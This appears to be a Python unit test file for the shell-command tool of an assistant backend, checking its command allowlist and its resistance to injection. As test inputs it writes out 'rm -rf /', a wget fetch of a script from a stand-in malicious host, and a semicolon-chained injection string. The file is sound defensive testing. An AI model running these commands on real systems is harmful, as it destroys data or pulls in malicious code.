import unittest
from unittest.mock import patch
import sys
import os

# Ensure backend can be imported
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from unittest.mock import MagicMock

# Mock psutil which is missing in the sandbox environment
sys.modules['psutil'] = MagicMock()

from edith.backend.tools.system_control import SystemControl

class TestSystemControl(unittest.TestCase):
    def setUp(self):
        self.sys_ctrl = SystemControl()

    def test_shell_empty_command(self):
        result = self.sys_ctrl.shell("")
        self.assertEqual(result, "Empty command.")

        result = self.sys_ctrl.shell("   ")
        self.assertEqual(result, "Empty command.")

    def test_shell_allowed_command(self):
        # We can mock subprocess.run to not actually run commands during testing,
        # or just test with a simple command like 'echo'
        result = self.sys_ctrl.shell("echo 'hello world'")
        self.assertEqual(result, "hello world")

    def test_shell_disallowed_command(self):
        result = self.sys_ctrl.shell("rm -rf /")
        self.assertEqual(result, "Command 'rm' is not allowed.")

        result = self.sys_ctrl.shell("wget http://malicious.com/malware.sh")
        self.assertEqual(result, "Command 'wget' is not allowed.")

    def test_shell_injection_attempt(self):
        # Even with an allowed base command, malicious attempts should fail safely
        # or be parsed properly as arguments rather than shell metacharacters
        # E.g. 'echo hello; rm -rf /' will be parsed as:
        # ['echo', 'hello;', 'rm', '-rf', '/']
        # The base command 'echo' is allowed, so it runs `echo hello; rm -rf /`.
        # Because shell=False, it safely prints "hello; rm -rf /"
        result = self.sys_ctrl.shell("echo hello; rm -rf /")
        self.assertEqual(result, "hello; rm -rf /")

    def test_shell_invalid_shlex(self):
        # Unmatched quotes
        result = self.sys_ctrl.shell("echo 'hello")
        self.assertTrue(result.startswith("Shell error:"))

if __name__ == '__main__':
    unittest.main()
